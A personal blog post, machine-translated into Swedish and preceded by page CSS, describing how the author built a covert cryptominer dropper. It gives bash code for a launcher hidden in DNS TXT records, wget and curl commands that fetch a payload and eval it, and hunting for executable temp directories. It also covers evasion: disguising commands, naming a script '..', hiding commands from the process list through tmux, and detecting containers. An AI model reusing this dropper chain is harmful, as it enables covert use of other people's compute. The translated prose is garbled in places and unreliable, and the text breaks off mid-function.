New;font-weight:700;position:absolute;right:0}#site-nav .horiz ul{list-style-type:none;line-height:4rem;height:4rem;margin:0}#site-nav .horiz ul>li{padding:0 .5rem;box-shadow:.25rem -.025rem .05rem var(--alt)}#site-nav .horiz ul>li{float:left;border-top:0;border-bottom:0;border-left:0;border-radius:50% 25% 25% 50%}#site-nav ul>li>a,#site-nav ul>li>button{color:var(--alt);display:inline-block}#site-nav .menu-icons{position:relative;padding:0 .2rem}#site-nav{display:block;width:auto;height:auto}.author__avatar>img{width:4em;height:4em;border-radius:50%;-o-object-fit:cover;object-fit:cover;border-width:.1rem;border-color:var(--accent3);border-style:solid;box-shadow:.1rem .06rem var(--accent3),-.05rem -.025rem .2rem var(--accent3)}#site-nav a:link{text-decoration:none}#site-nav .ham,#site-nav .vert{display:none}.author__avatar{-o-object-fit:contain;object-fit:contain;float:left}.author__wrap>ul{float:left;height:inherit;margin:0;padding:0 10px}.author__wrap>ul>li{position:relative;float:left;list-style-type:none;font-size:1rem;padding:0 .2rem;text-align:center}ul>li.author__urls{font-size:2rem}ul>li.author__urls a:visited{color:var(--accent)}.author__wrap .author__avatar{float:left}.langs-dropdown-content{display:none;text-align:left}.langs-dropdown-content a{display:block}.menu-lang-btn:before{border-radius:25% 25% 25% 50%!important}.lang-link .flag{position:absolute;left:1rem;margin-top:.65rem}#site-nav .langs-dropdown-menu{left:1.5rem;position:relative;top:1rem}#site-nav .langs-dropdown-menu .lang-list{font-size:1rem;line-height:2rem;overflow-x:hidden;height:20rem;position:absolute;overflow-y:scroll;right:1rem;scrollbar-width:thin;border:solid;border-radius:25%;border-width:0 0 0 .25rem;padding-left:3rem}.lang-list{background-color:var(--background-color)}#site-nav ul>li>button{background:inherit;border:inherit;font-size:inherit;font-family:inherit;font-weight:inherit;padding:inherit;margin:inherit;list-style-type:inherit;line-height:inherit;height:inherit}.franklin-content{padding:0 0 2rem;z-index:0}.franklin-content{padding-top:1rem}.lunrSearchForm{margin-right:-.4rem;font-size:0;overflow:hidden}.lunrSearchForm .search-input{background:var(--background-color);color:var(--alt);border-width:.2rem;border:none;outline:0;border-radius:50% 25% 25% 50%;line-height:1.75rem;padding:.5rem 0 .5rem 2.25rem;width:7rem;position:relative;top:.5rem;font-family:Courier New;font-weight:700;font-size:1.5rem}.lunrSearchForm .search-button{color:var(--alt);background:0 0;border:none;font-size:1.5rem;padding:.2rem .2rem .2rem 0;position:absolute;top:1rem;left:.75rem;z-index:1}@media (min-width:680px) and (max-width:1300px){.lunrSearchForm .search-input{font-size:1rem;padding-left:2.75rem;width:4.5rem;border-radius:50% 100% 100% 50%}body{max-width:640px;min-height:320px}#site-nav{position:relative;z-index:1}#site-nav .ham{outline:0}#site-nav .ham,#site-nav .ham-icon{display:block;height:3rem;line-height:3rem;position:absolute;right:0;top:0;text-align:right;background:0 0;border:none;font-size:3rem;color:var(--accent)}#site-nav .horiz{display:none}#site-nav .vert{display:block;float:none;position:absolute;right:0;top:3rem;width:9rem;padding-left:1rem;max-height:0;overflow:hidden;filter:blur(1rem)}#site-nav .vert ul{margin:0;padding:10px 0}#site-nav .vert ul>li{width:100%;text-align:center;border-radius:25% 50% 50% 25%;padding:.5rem 1rem;box-shadow:-.25rem 0 .05rem var(--alt)}}@media (max-width:680px){.lang-link{height:3rem}.lunrSearchForm{display:block;width:28rem}.lunrSearch{position:absolute;top:-4rem;display:block;left:0;width:calc(2rem + 90%)}.lunrSearch .search-input{width:26rem}.masthead,.masthead__menu{display:block}.site-title{float:none;width:100%;display:block;text-align:center}.author__wrap{float:none;display:block;width:100%;height:4.4rem;text-align:center}.author__wrap ul{width:auto;float:none;padding:0;display:inline-block}#site-nav{float:none;padding:10px 0;position:relative;top:4rem}#site-nav ul li{float:none}.horiz{text-align:center}#site-nav ul{display:inline-block;padding:0}.masthead{height:14rem}}.lunrSearchForm{margin-top:1em}@media (max-width:480px){.lunrSearchForm .search-input{width:18rem;left:-4rem}.masthead{height:34rem}#site-nav{top:5rem}#site-nav .horiz ul{width:100%}#site-nav .horiz ul>li{width:calc(100% - 2rem);float:none}}@media (min-width:480px) and (max-width:680px){.masthead{height:20rem}}@media (max-width:680px){body{overflow-x:hidden}#site-nav{z-index:1}#site-nav .horiz ul>li{float:none;top:-4rem;position:relative;margin-top:1rem;margin-bottom:0}}@-webkit-keyframes chars{0%,1.8105942029%{content:"u"}1.8115942029%,3.6221884058%{content:"un"}3.6231884058%,5.4337826087%{content:"unt"}5.4347826087%,7.2453768116%{content:"unto"}7.2463768116%,9.0569710145%{content:"untor"}10.8685652174%,9.0579710145%{content:"untore"}10.8695652174%,12.6801594203%{content:"untoreh"}12.6811594203%,14.4917536232%{content:"untoreh'"}14.4927536232%,16.3033478261%{content:"untoreh's"}16.3043478261%,18.114942029%{content:"untoreh's "}18.115942029%,19.9265362319%{content:"untoreh's s"}19.9275362319%,21.7381304348%{content:"untoreh's si"}21.7391304348%,23.5497246377%{content:"untoreh's sit"}23.5507246377%,to{content:"untoreh's site"}}@keyframes chars{0%,1.8105942029%{content:"u"}1.8115942029%,3.6221884058%{content:"un"}3.6231884058%,5.4337826087%{content:"unt"}5.4347826087%,7.2453768116%{content:"unto"}7.2463768116%,9.0569710145%{content:"untor"}10.8685652174%,9.0579710145%{content:"untore"}10.8695652174%,12.6801594203%{content:"untoreh"}12.6811594203%,14.4917536232%{content:"untoreh'"}14.4927536232%,16.3033478261%{content:"untoreh's"}16.3043478261%,18.114942029%{content:"untoreh's "}18.115942029%,19.9265362319%{content:"untoreh's s"}19.9275362319%,21.7381304348%{content:"untoreh's si"}21.7391304348%,23.5497246377%{content:"untoreh's sit"}23.5507246377%,to{content:"untoreh's site"}}@-webkit-keyframes cursor{75%{border-color:transparent}}@keyframes cursor{75%{border-color:transparent}}.site-title{-webkit-backface-visibility:hidden;backface-visibility:hidden;font-size:1.5rem;font-family:VT323,monospace,sans-serif;color:var(--accent2);-webkit-font-smoothing:antialiased;-moz-osx-font-smoothing:grayscale}.site-title:after{content:"​";position:relative;padding-right:.5em;border-right:.5em solid var(--accent);white-space:nowrap;-webkit-animation:5.52s linear 1s forwards chars,1s 3 cursor;animation:5.52s linear 1s forwards chars,1s 3 cursor}.franklin-content a{display:inline-block;vertical-align:middle;text-decoration:none;transform:perspective(1px) translateZ(0);box-shadow:0 0 1px var(--alt2);position:relative;overflow:hidden}.franklin-content a:before{content:"";position:absolute;z-index:-1;left:51%;right:51%;bottom:0;background:var(--accent);height:4px}.hvr-outline-in{display:inline-block;vertical-align:middle;transform:perspective(1px) translateZ(0);box-shadow:0 0 1px var(--alt2);position:relative}.horiz .hvr-outline-in:before{border-radius:50% 25% 25% 50%;right:-.25rem}.vert .hvr-outline-in:before{border-radius:25% 50% 50% 25%;left:-.25rem}.hvr-outline-in:before{content:"";position:absolute;border:var(--alt) solid .25rem;top:0;bottom:0;left:0;opacity:0}#site-nav .vert:before{background-color:var(--background-color);filter:blur(.25rem);content:"";height:100%;width:100%;position:absolute}.author__avatar{background-color:transparent;perspective:1000px}.masthead__menu ul li.author__avatar img{transform-style:preserve-3d}.flag{display:inline-block;position:relative;width:16px;height:11px;background:url(/assets/flags.png) no-repeat}.flag.flag-th{background-position:-16px -143px}.flag.flag-tr{background-position:-144px -143px}.flag.flag-fr{background-position:-80px -44px}.flag.flag-nl{background-position:-240px -99px}.flag.flag-ms{background-position:-16px -99px}.flag.flag-es{background-position:-224px -33px}.flag.flag-vn{background-position:-128px -154px}.flag.flag-za{background-position:-256px -154px}.flag.flag-ph{background-position:-144px -110px}.flag.flag-ru{background-position:-96px -121px}.flag.flag-pl{background-position:-176px -110px}.flag.flag-gb{background-position:-112px -44px}.flag.flag-ro{background-position:-64px -121px}.flag.flag-pt{background-position:-256px -110px}.flag.flag-in{background-position:-64px -66px}.flag.flag-kr{background-position:-80px -77px}.flag.flag-ua{background-position:-224px -143px}.flag.flag-jp{background-position:-224px -66px}.flag.flag-de{background-position:-32px -33px}.flag.flag-se{background-position:-208px -121px}.flag.flag-gr{background-position:-48px -55px}.flag.flag-id{background-position:-256px -55px}.flag.flag-pk{background-position:-160px -110px}.flag.flag-bd{background-position:-16px -11px}.flag.flag-it{background-position:-144px -66px}.flag.flag-sa{background-position:-128px -121px}.flag.flag-cn{background-position:-176px -22px}</style><link as=style href=/css/bundle.css rel=preload><noscript><link href=/css/bundle.css rel=stylesheet></noscript><link href=/assets/favicon.png rel=icon type=image/x-icon><link href=/assets/favicon.svg rel=icon type=image/svg+xml><title> Krönikor om en kryptonot dropper</title><meta content="...How far are you willing to go for...pennies?"name=description><script src=/libs/load.js></script><script type=application/ld+json>{"url":"/sv/posts/chronichles_of_a_cryptonote_dropper/","mainContentOfPage":{"@type":"WebPageElement","cssSelector":".franklin-content"},"accessMode":["textual","visual"],"mentions":null,"description":"","@context":"https://schema.org","accessModeSufficient":{"itemListElement":["textual","visual"],"@type":"itemList"},"@type":"https://schema.org/WebPage","lastReviewed":"","dateCreated":"","@id":"/sv/posts/chronichles_of_a_cryptonote_dropper/","dateModified":"","keywords":[],"creativeWorkStatus":"Published","translator":{"url":"http://google.translate.com","name":"Google Translate","@type":"https://schema.org/Organization"},"translationOfWork":{"@id":"https://www.unto.re/posts/chronichles_of_a_cryptonote_dropper/"},"datePublished":"2022-12-07T19:01:43.816","inLanguage":"sv","name":"","mainEntityOfPage":{"@id":"/sv/posts/chronichles_of_a_cryptonote_dropper/","@type":"Article"}}</script><script type=application/ld+json>{"sameAs":["https://github.com/untoreh","https://twitter.com/untoreh"],"email":"contact@unto.re","name":"untoreh","@type":"https://schema.org/Person","image":"/assets/appa.webp"}</script><script type=application/ld+json>{"potentialAction":{"query-input":"required maxlength=100 name=input","actionStatus":"https://schema.org/PotentialActionStatus","query":"required","@type":"SearchAction","target":{"uri":"","scheme":"https","userinfo":"","host":"www.unto.re","port":"","path":"/search","query":"q=%7Binput%7D","fragment":""}}}</script><script type=application/ld+json>{"potentialAction":{"query-input":"required maxlength=100 name=input","actionStatus":"https://schema.org/PotentialActionStatus","query":"required","@type":"SearchAction","target":{"uri":"","scheme":"https","userinfo":"","host":"www.unto.re","port":"","path":"/search","query":"q=%7Binput%7D","fragment":""}}}</script><body><div class=masthead><div class=masthead__menu__inner-wrap><div class=masthead__menu><a title="untoreh's site"class=site-title href=/sv/></a><div class=author__wrap><ul><li class=author__avatar><li class="author__urls social-icons"><a rel="nofollow noopener noreferrer" title="Twitter link"href=https://twitter.com/untoreh><i class="fab fa-fw fa-twitter-square"aria-hidden=true></i></a><li class="author__urls social-icons"><a rel="nofollow noopener noreferrer" title="GitHub link"href=https://github.com/untoreh><i class="fab fa-fw fa-github"aria-hidden=true></i></a><li class="author__urls social-icons"><a href=mailto:contact@unto.re title=email><i class="fas fa-envelope"></i></a><li></ul></div><nav id=site-nav><div class=horiz><ul><li class="lunrSearch masthead__menu-item hvr-outline-in"><li class="masthead__menu-item hvr-outline-in"><a title="All the articles that I have written"href=/sv/posts/><i class="fas fa-pen menu-icons"></i> inlägg</a><li class="masthead__menu-item hvr-outline-in"><a title="Video and audio content from streaming websites."href=/sv/media/><i class="fas fa-tv menu-icons"></i> media</a><li class="masthead__menu-item hvr-outline-in menu-lang-btn" title="Change website's language"></ul></div><div class=vert><ul><li class="lunrSearch masthead__menu-item hvr-outline-in"><li class="masthead__menu-item hvr-outline-in"><a title="All the articles that I have written"href=/sv/posts/><i class="fas fa-pen menu-icons"></i> inlägg</a><li class="masthead__menu-item hvr-outline-in"><a title="Video and audio content from streaming websites."href=/sv/media/><i class="fas fa-tv menu-icons"></i> media</a><li class="masthead__menu-item hvr-outline-in menu-lang-btn" title="Change website's language"></ul></div></nav></div></div></div><div><h1 id=title><a href=/sv/posts/chronichles_of_a_cryptonote_dropper> Krönikor om en kryptonot dropper</a></h1><blockquote id=page-description style=font-style:italic>... Hur långt är du villig att gå för ... slantar?</blockquote></div><div class=franklin-content><p>Antag att du vill gruva<a href=https://en.wikipedia.org/wiki/Cryptocurrency> kryptovalutor</a> på fjärrkontrollen<em> virtuell</em> hårdvara. Du måste hitta något för mig. Fjärrservrar betyder nej<a href=https://en.wikipedia.org/wiki/Application-specific_integrated_circuit> ASICS</a> eller GPU -bevis på arbetsalgoritmer, i princip bara<a href=\posts/a-few-notes-on-proof-of-work> CPU -vänliga mynt</a>.<h2 id=the_software><a class=header-anchor href=#the_software> Mjukvaran</a></h2><p>Sök och hitta en<a href=https://github.com/xmrig/xmrig> gruvarbetare</a> , men det är inte riktigt trevligt, du skulle vilja ha något du kan styra bättre från fjärrkontrollen, så du hittar<a href=https://github.com/Bendr0id/xmrigCC> en annan gruvarbetare</a> . Du vill också ha<a href=https://github.com/Bendr0id/xmrigcc-proxy> ombud</a> , eftersom många anslutningar blir kortlivade, vill du inte<a href=https://en.wikipedia.org/wiki/Denial-of-service_attack> dos</a> din gruvpool. Också en<a href=https://github.com/search?q=tunnel> tunnel</a> skulle vara trevligt.<h2 id=the_design><a class=header-anchor href=#the_design> Designen</a></h2><p>Vissa botnät använder blockchains -data för att leta upp kommandon,<a href=https://twitter.com/sarahjamielewis> någon</a> verkar också ha<a href=https://web.archive.org/web/https://twitter.com/SarahJamieLewis/status/1185724467776851968> förlorade satsningar</a> om detta inte händer igen ... ändå är vi inte så sofistikerade, vi kommer att klara oss med några DNS -poster som lagrar ett skript som drar nyttolasten som själv extraherar i en tillfällig katalog körs och lämnar<em> nästan</em> inga spår av dess inställning. Här är ett litet flödesschema som visar strukturen<h2 id=launcher><a class=header-anchor href=#launcher> Launcher</a></h2><p>Poängen med ett startskript är att vara tillgängligt och enkelt att uppdatera så att det tål tidstest. Uppdaterar<a href=https://en.wikipedia.org/wiki/Domain_Name_System> DNS</a> poster är enkla och DNS är det sista som stängs av inom ett nätverk ... eftersom IP -adresser är svåra att komma ihåg ... så chansen är stor att det kommer att vara tillgängligt för det mesta. Du ser när vi är<em> hämtar distributionskriptet</em>vi kör faktiskt redan lite logik, det här är startskriptet, det behöver möjlighet att utföra DNS -frågor för att leta upp våra poster, DNS kan vara allestädes närvarande men<a href=https://web.archive.org/web/20201107155737/https://downloads.isc.org/isc/bind9/> gräv</a> är inte.<p>Det finns en liten gåta här, om vi måste ladda ner ett annat verktyg<em> för att ladda ner ett annat skript för att ladda ner nyttolasten</em> vi borde bara ladda ner nyttolasten! Till försvar ... gör den här manusdansen till oklarhet, gör det möjligt att behålla endast en implementering av startprogrammet (underhållbarhet, yay), krävs inte de flesta gånger..så vi servar också en<a href=https://en.wikipedia.org/wiki/Standalone_program> statiskt kopplad</a> gräva körbar för att utföra dns -frågor, hämtade antingen genom självvärd eller molnhotell (ja det finns återkopplingar, som 3 eller 4, eftersom molntjänster har mycket minimal ledig bandbredd och kräver också cookies eller åtkomsttoken ... de är väldigt skript ovänligt, medvetet så, förstås).<p>Vad finns i dns -poster? Vi använder<a href=https://en.wikipedia.org/wiki/TXT_record> Text</a> poster, på en anpassad domän (fallbackar här också). Varför TXT? de råkar vara de som kan lagra den största mängden data ... vanligtvis eftersom det är typ av<a href=https://www.ietf.org/rfc/rfc6763.txt> rekommenderad</a> beroende på<em> saker</em> . Vi använder specifikt<a href=https://www.cloudflare.com/> molnblåsa</a> för vår DNS -fiffling eftersom den är gratis och i stort sett den enda spelaren i stan (<em> väl egentligen inte men någon annan alternativ blek funktioner funktioner klokt</em> ). Det händer att du kan lagra flera bitar av data på<em> samma</em> rekord ... det här börjar bli förvirrande och förvirrande för vissa specifikationer ... (tangent) Cloudflare<a href=https://web.archive.org/save/https://community.cloudflare.com/t/was-there-a-reduction-in-maximum-txt-size> brukade</a> tillåta<em> kedjad</em>TXT -poster på totalt ~ 9k byte, docs anger nu ~ 2k byte, före ändringen använde jag ~ 6k tror jag och serverade skriptet okomprimerat, efter det var jag tvungen att tunna ut skriptet och komprimera det för hand (faktiskt jag försökt använda en<a href=https://freedns.afraid.org/> freedns</a> leverantör, jag blev bannad inom en dag, gissar att de har en strikt fettfri TXT-registerpolicy), men gzip-komprimering verkar INTE vara rörvänlig och orsakade fortfarande problem, så jag var tvungen att klämma in skriptet utan komprimering ( ändtangent).<p>Hur lagrar vi det? TXT -poster stöder bara alfanumeriska strängar, nej<a href=https://en.wikipedia.org/wiki/Null_character> NUL</a> , så vi måste slå in den i en icke -null -kodning,<a href=https://en.wikipedia.org/wiki/Base64> bas64</a> uppfyller denna begränsning, och för att vi lagrar<em> kedjad</em> TXT -poster, vi måste chunk utgången, eftersom vi använder skal grejer, detta görs genom<code>-w</code> flagga, på busybox sådan flagga brukade vara frånvarande (eller välja) på äldre versioner vilket var irriterande, ett alternativ är att använda kodaren som medföljer openssl,<code>openssl enc -base64</code>.<p>Nu när vi vet hur vi lagrar vårt distributionskript lagrar vi det med<a href=https://web.archive.org/web/20210305071742/https://github.com/cloudflare/cloudflare-go/blob/master/cmd/flarectl/README.md> cf cli</a> eller manuellt. Hur drar vi det? Vi nämnde att vi behöver bindutils eller våra egna<code>dig</code> ... efter att ha valt serverings slutpunkt, vill vi ladda ner den, det som är tillgängligt är vanligtvis<a href=https://www.gnu.org/software/wget/> wget</a> eller<a href=https://curl.se/> ringla</a> , wget finns förinstallerat mycket oftare, men busybox ger bara tls -stöd med dynamiska bibliotek, så du måste se till att slutpunkten tjänar http eller ditt verktyg är<code>wget</code> från gnu-utils<pre><code class="bash hljs"><span class=hljs-comment># the wget command</span>
wget -t 2 -T 10 -q -i- -O- > <span class=hljs-variable>$filename</span> <<< <span class=hljs-string>"<span class=hljs-variable>$digurl</span>"</span></code></pre><p>Det betyder försök<code>-t2</code> gånger väntar<code>-T10</code> sekunder vara<code>-q</code> tyst läsning från<code>-i-</code> stdin (<code>$digurl</code> ) och skriva till<code>-O-</code> stdout (<code>$filename</code>). Detta kommando avslöjar inte vad vi laddar ner vid en första anblick. Vi kommer att vara mycket försiktiga med andra skalkommandon av samma anledning, eller hålla oss till skal (<a href=https://en.wikipedia.org/wiki/Bash_%28Unix_shell%29> våldsamt slag</a> ) inbyggda där det är möjligt. Var också noga med var du laddar ner dina körbara filer, du vill se till att du kan köra dem, eftersom vissa monteringspunkter, särskilt i behållare och<code>tmp</code> vägar är<code>noexec</code> . Nu när vi har vårt dns -frågeverktyg hämtar vi våra poster<pre><code class="bash hljs">dig txt <span class=hljs-variable>${record}</span>.<span class=hljs-variable>${zone}</span> +short +tcp +<span class=hljs-built_in>timeout</span>=3 +retries=0 <span class=hljs-variable>$dnsserver</span></code></pre><p>Flaggor är självförklarande här,<code>+short</code> betyder bara att vi bara är intresserade av själva data, så att vi inte behöver analysera utdata. Det är viktigt att ange DNS -servern, som google (<code>8.8.8.8</code> ) eller cloudflare (<code>1.1.1.1</code> ) sådana eftersom många miljöer omdirigerar eller proxy -dnsfrågor till sina egna dns -servrar som standard. Efter att ha hämtat det klumpiga manuset hanterar vi citattecken och blanksteg för att göra det klart för avkodning<pre><code class="bash hljs">data=<span class=hljs-variable>${data//\"}</span><span class=hljs-comment># remove quotes</span>
data=<span class=hljs-variable>${data// }</span><span class=hljs-comment># remove whitespace</span><span class=hljs-built_in>declare</span> -a ar_data
<span class=hljs-keyword>for</span> l <span class=hljs-keyword>in</span><span class=hljs-variable>$data</span>; <span class=hljs-keyword>do</span>
    ar_data[<span class=hljs-variable>${l:0:1}</span>]=<span class=hljs-variable>${l:1}</span><span class=hljs-comment># iterate over each line and remove the first characther</span><span class=hljs-keyword>done</span>
data=<span class=hljs-variable>${ar_data[@]}</span><span class=hljs-comment># join all the lines</span>
data=<span class=hljs-variable>${data// }</span><span class=hljs-comment># ensure joining didn't add whitespace</span><span class=hljs-comment># decode</span>
launcher=$(<span class=hljs-built_in>echo</span><span class=hljs-string>"<span class=hljs-variable>$launcher</span>"</span> | <span class=hljs-variable>$b64</span> -d -w <span class=hljs-variable>$chunksize</span>)</code></pre><p>Tänk om vi nu<em> fortfarande</em> har du inte vår launcher? DNS är rörigt, vi vill ha en återkoppling, låter oss konfigurera en underdomän för att hämta startskriptet direkt. Innan vi utvärderar vårt skript vill vi anpassa det, med några variabler, igen kan vi använda en TXT -post för att lagra en NAME = VALUE -lista med variabler och analysera den. Det finns också en backback för variabler, cloudflare erbjuder omdirigeringar baserade på webbadresser, dessa omdirigeringar visas<em> innan</em> destinationen, så vi behöver inte en slutpunkt, vi vill bara konfigurera regexbaserade omdirigeringsregler till en fiktiv slutpunkt, det vi är intresserade av är parametrarna för webbadressen<code>?NAME=VALUE&NAME2=VALUE2...</code>, så att vi kan parametrisera vår launcher helt enkelt genom att ändra omdirigeringsadressen, alltid med uppmärksamhet på att citera och undkomma koder<pre><code class="bash hljs"><span class=hljs-comment>## m1 also important to stop wget</span>
pl_vars=$(<span class=hljs-built_in>echo</span><span class=hljs-string>"<span class=hljs-variable>$token_url</span>"</span> | wget -t 1 -T 3 -q -i- -S 2>&1 | grep -m1 <span class=hljs-string>'Location'</span>)
pl_vars=<span class=hljs-variable>${pl_vars#*\/}</span>
pl_vars=<span class=hljs-variable>${pl_vars//\"&/\" }</span>
pl_vars=<span class=hljs-variable>${pl_vars//%3F/\?}</span></code></pre><p>Wget<code>-S</code> skriver ut omdirigeringsadressen som vi är intresserade av för analys. Med parametrarna och skriptet utvärderar vi variablerna som skriver dem över en fil<pre><code class="bash hljs"><span class=hljs-built_in>eval</span><span class=hljs-string>"<span class=hljs-variable>$pl_vars</span>"</span><span class=hljs-built_in>echo</span><span class=hljs-string>"export \
<span class=hljs-variable>$pl_vars</span> \
<span class=hljs-variable>$ENV_VARS</span> \
"</span>>env.sh</code></pre><p>Den här filen kommer från deploy -skriptet. Den sista delen av startskriptet är till verklig<a href=https://en.wikipedia.org/wiki/Trampoline_(computing)> trampolin</a> , utvärdera skriptet inom den aktuella skalprocessen, eller kanske låta det hanteras av tmux om möjligt.<pre><code class="bash hljs"><span class=hljs-comment># printf preserves quotes</span><span class=hljs-built_in>eval</span><span class=hljs-string>"<span class=hljs-subst>$(printf '%s' <span class=hljs-string>"<span class=hljs-variable>$launcher</span>"</span>)</span>"</span> &>/dev/null
<span class=hljs-comment># or tmux</span><span class=hljs-built_in>echo</span><span class=hljs-string>"<span class=hljs-variable>$launcher</span>"</span> > <span class=hljs-string>".. "</span>
tmux send-keys -t miner <span class=hljs-string>". ./\".. \""</span> Enter</code></pre><p>Startskriptet dumpas till en fil med namnet ".." det här ser förvirrande ut eftersom det kan misstas som en<em> förälder</em> katalog. Och vi inkluderar inte sessionskommandot, eftersom det skulle dröja kvar i processkommandot, istället startar vi tmux -sessionen i förväg och skickar källkommandot via tmux -terminalgränssnittet. Relaterat till detta, ibland ringer en körbar med<code>./</code> håller dessa tecken i kommandot, så det är bättre att lägga till<code>$PWD</code> till vägen ..<code>PATH=$PWD:$PATH</code>.<h2 id=the_payload><a class=header-anchor href=#the_payload> Nyttolasten</a></h2><p>Vårt implementeringsskript börjar med att köpa<code>env.sh</code> fil och behålla eller konfigurera vars as<code>STARTING_*</code> vars gillar<pre><code class="bash hljs">STARTING_PATH=<span class=hljs-variable>${STARTING_PATH:-<span class=hljs-variable>$PATH</span>}</span>
STARTING_PID=<span class=hljs-variable>$BASHPID</span></code></pre><p>Detta gör att vi kan döda och starta om en löpande instans samtidigt som vi återställer miljön. Låter oss byta till en tmp -katalog med exec -funktioner<pre><code class="bash hljs"><span class=hljs-comment># out local subdirectory</span>
pathname=$(<span class=hljs-built_in>printf</span><span class=hljs-string>".%-<span class=hljs-subst>$((RANDOM%9+1)</span>)s"</span><span class=hljs-keyword>for</span> ph <span class=hljs-keyword>in</span> {/tmp,/dev/shm,/run,/var/tmp,/var/cache,~/.local,~/.cache,~/}; <span class=hljs-keyword>do</span><span class=hljs-built_in>rm</span> -rf <span class=hljs-string>"<span class=hljs-variable>$ph</span>/<span class=hljs-variable>$pathname</span>"</span> &&
        <span class=hljs-built_in>mkdir</span> -p <span class=hljs-string>"<span class=hljs-variable>$ph</span>/<span class=hljs-variable>$pathname</span>"</span> &&
        tmppath=<span class=hljs-string>"<span class=hljs-variable>$ph</span>/<span class=hljs-variable>$pathname</span>"</span> &&
        is_path_executable <span class=hljs-string>"<span class=hljs-variable>$tmppath</span>"</span> &&
        <span class=hljs-built_in>export</span> PATH=<span class=hljs-string>"<span class=hljs-variable>${ph}</span>/<span class=hljs-variable>$pathname</span>:<span class=hljs-variable>${PATH}</span>"</span> tmppath &&
        <span class=hljs-built_in>break</span><span class=hljs-keyword>done</span>
[ -n <span class=hljs-string>"<span class=hljs-variable>$tmppath</span>"</span> ] && <span class=hljs-built_in>cd</span><span class=hljs-string>"<span class=hljs-variable>$tmppath</span>"</span></code></pre><p>Kontrollerar om inom en<a href=https://en.wikipedia.org/wiki/OS-level_virtualization> behållare</a> är också praktiskt, kan vi undersöka filsystemet för tips<pre><code class="bash hljs">c=$(<span class=hljs-built_in>builtin</span> compgen -G <span class=hljs-string>'/etc/cpa*'</span>)
d=$(<span class=hljs-built_in>builtin</span> compgen -G <span class=hljs-string>'/dev/*'</span>)
s=$(<span class=hljs-built_in>builtin</span> compgen -G <span class=hljs-string>'/sys/*'</span>)
p=$(<span class=hljs-built_in>builtin</span> compgen -G <span class=hljs-string>'/proc/*'</span>)
jail=
<span class=hljs-keyword>if</span> [ -n <span class=hljs-string>"<span class=hljs-variable>$c</span>"</span> -o -z <span class=hljs-string>"<span class=hljs-variable>$d</span>"</span> -o -z <span class=hljs-string>"<span class=hljs-variable>$s</span>"</span> -o -z <span class=hljs-string>"<span class=hljs-variable>$p</span>"</span> ]; <span class=hljs-keyword>then</span><span class=hljs-comment>## we are in a jail</span>
    jail=1
<span class=hljs-keyword>fi</span></code></pre><p>Nu är det dags att ladda ner vår nyttolast, vi väljer att stödja både wget och curl, vi vet redan hur man använder wget med noggranna flaggor, för curl är det lite annorlunda. Vi måste skapa en konfigurationsfil och åsidosätta<code>CURL_HOME</code><pre><code class="bash hljs"><span class=hljs-built_in>echo</span><span class=hljs-string>"url = <span class=hljs-variable>$uri</span>
output = <span class=hljs-variable>${name}</span><span class=hljs-variable>${format}</span>
connect-timeout = 10
"</span> > .curlrc
CURL_HOME=<span class=hljs-variable>$PWD</span> curl -sOL</code></pre><p>Sista steget är bara att extrahera nyttolasten<pre><code class="bash hljs"><span class=hljs-built_in>type</span> unzip &>/dev/null &&
    format=<span class=hljs-string>".zip"</span> extract=<span class=hljs-string>"unzip -q"</span> ||
        format=<span class=hljs-string>".tar.gz"</span> extract=<span class=hljs-string>"tar xf"</span></code></pre><p>Det är värt att nämna användningen av ett [CDN] för service av nyttolasten. Här räddar molnbländning till undsättning oss från bandbreddskostnader. Genom att helt enkelt byta namn på vår komprimerade nyttolast med en<em> filtillägg</em> stöds av cloudflare ... det blir cachat. Cloudflare kontrollerar inte rubrikerna för vad det servar, kanske för att göra det i den skalaen är helt enkelt opraktiskt.<h2 id=adventures_down_bashland><a class=header-anchor href=#adventures_down_bashland> Äventyr längs Bashland</a></h2><p>Bash valdes med antagandet att det är bärbart, ser inte alltför malplacerat ut och är mer allestädes närvarande jämfört med andra skriptspråk som perl, rubin eller python. Sanningen är att en fristående binär skriven i golang eller lua hade varit mycket lättare, med mindre buggar och lättare att underhålla, i grund och botten var det värsta valet möjligt, till mitt försvar, när jag repade så många kliar med bash , det var för sent för en omskrivning, och det blev också lite tråkigt.<p>Det fanns också möjlighet att använda busybox med kompileringstidsflaggan för att använda alla inbyggda (som grep och sed), men att använda inbyggda på det här sättet tillåter inte att leka jobb (gaffel) och utsätter demonen för potentiella dödlägen.<p>Jag kommer att beskriva några bash -funktioner här, med hela listan tillgänglig<a href=\assets/posts/bash_functions.txt> här</a><pre><code class="bash hljs"><span class=hljs-comment>## echo a string long $1 of random lowercase chars</span><span class=hljs-function><span class=hljs-title>rand_string</span></span>() {
    <span class=hljs-built_in>local</span> c=0
    <span class=hljs-keyword>while</span> [ <span class=hljs-variable>$c</span> -lt <span class=hljs-variable>$1</span> ]; <span class=hljs-keyword>do</span><span class=hljs-built_in>printf</span><span class=hljs-string>"\x<span class=hljs-subst>$(printf '%x' $((97+RANDOM%25)</span>))"</span>
        c=$((c+<span class=hljs-number>1</span>))
    <span class=hljs-keyword>done</span>
}</code></pre><p>Använd<code>RANDOM</code> variabel för att få ett tal mellan 97-122 motsvarande en teckenkod, printf ska vara en inbyggd, vi vill inte gaffla inom en loop.<pre><code class="bash hljs"><span class=hljs-comment>## make a new file descriptor named $1</span><span class=hljs-function><span class=hljs-title>newfd</span></span>() {
    <span class=hljs-built_in>eval</span><span class=hljs-string>"local fd=\${<span class=hljs-variable>$1</span>}"</span><span class=hljs-built_in>eval</span><span class=hljs-string>"exec <span class=hljs-variable>$fd</span>>&-"</span> &>/dev/null
    <span class=hljs-built_in>local</span> pp=<span class=hljs-string>".<span class=hljs-subst>$(rand_string 8)</span>"</span><span class=hljs-built_in>mkfifo</span><span class=hljs-variable>$pp</span><span class=hljs-built_in>unset</span><span class=hljs-string>"<span class=hljs-variable>$1</span>"</span><span class=hljs-built_in>eval</span><span class=hljs-string>"exec {<span class=hljs-variable>$1</span>}<><span class=hljs-variable>$pp</span>"</span><span class=hljs-comment># unlink the named pipe</span><span class=hljs-built_in>rm</span> -f <span class=hljs-variable>$pp</span>
}</code></pre><p>Dra rör för att skapa anonyma filbeskrivare, de beter sig inte exakt som filbeskrivare men de är tillräckligt bra för<a href=https://en.wikipedia.org/wiki/Inter-process_communication> IPC</a>.<pre><code class="bash hljs"><span class=hljs-comment>## https://unix.stackexchange.com/a/407383/163931</span><span class=hljs-function><span class=hljs-title>fleep</span></span>()
{
    <span class=hljs-comment># log "fleep: called by ${FUNCNAME[1]}"</span>
